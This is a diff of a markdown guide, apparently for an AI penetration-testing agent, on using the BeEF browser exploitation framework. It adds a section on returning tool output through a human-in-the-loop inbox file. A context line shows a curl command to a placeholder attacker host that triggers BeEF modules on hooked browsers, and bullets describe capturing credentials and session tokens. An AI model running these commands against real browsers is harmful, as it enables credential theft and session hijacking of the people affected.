@@ -84,3 +84,21 @@ curl -X POST http://ATTACKER_IP:3000/api/modules/HOOK_ID/MODULE_ID?token=API_TOK
 - Internal network discovery from hooked browsers expands assessment scope
 - Captured credentials feed into authentication testing
 - Session tokens captured via BeEF validate session hijacking impact
+
+## Operator Help
+
+To provide tool output for this request, save the full command output to the
+HIL inbox file indicated by the agent:
+
+```
+strix/hil/inbox/resp_<TASK_ID>.txt
+```
+
+You can also pipe output directly:
+
+```
+beef [OPTIONS] TARGET > strix/hil/inbox/resp_<TASK_ID>.txt
+```
+
+The agent will automatically detect and parse the response.  See the
+`HIL_INBOX_PATH` environment variable to customise the inbox location.
